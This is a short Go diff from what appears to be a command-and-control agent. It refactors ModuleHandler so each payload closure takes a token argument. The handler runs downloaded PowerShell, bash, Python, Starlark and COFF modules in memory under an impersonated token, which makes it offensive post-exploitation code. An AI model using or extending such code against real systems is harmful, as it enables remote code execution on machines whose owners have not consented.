@@ -41,7 +41,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
-		err = executeWithToken(invocation.Token, func() error {
+		err = executeWithToken(invocation.Token, func(_ uintptr) error {
 			var execErr error
 			out, execErr = agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
 			if execErr != nil {
@@ -54,7 +54,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		}
 		return out
 	case "bash":
-		err = executeWithToken(invocation.Token, func() error {
+		err = executeWithToken(invocation.Token, func(_ uintptr) error {
 			var execErr error
 			out, execErr = agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
 			if execErr != nil {
@@ -67,7 +67,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		}
 		return out
 	case "python":
-		err = executeWithToken(invocation.Token, func() error {
+		err = executeWithToken(invocation.Token, func(_ uintptr) error {
 			var execErr error
 			out, execErr = agentutils.ExecutePython(payload_data, invocation.Argv, nil)
 			if execErr != nil {
@@ -80,9 +80,9 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		}
 		return out
 	case "starlark":
-		err = executeWithToken(invocation.Token, func() error {
+		err = executeWithToken(invocation.Token, func(token uintptr) error {
 			var execErr error
-			out, execErr = script.Run(payload_data, invocation.Argv, nil)
+			out, execErr = script.Run(payload_data, invocation.Argv, nil, token)
 			if execErr != nil {
 				out = logging.Sprintf("running starlark module: %v", execErr)
 			}
@@ -93,7 +93,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		}
 		return out
 	case "coff":
-		err = executeWithToken(invocation.Token, func() error {
+		err = executeWithToken(invocation.Token, func(_ uintptr) error {
 			var execErr error
 			out, execErr = runCOFFModule(payload_data, invocation)
 			if execErr != nil {
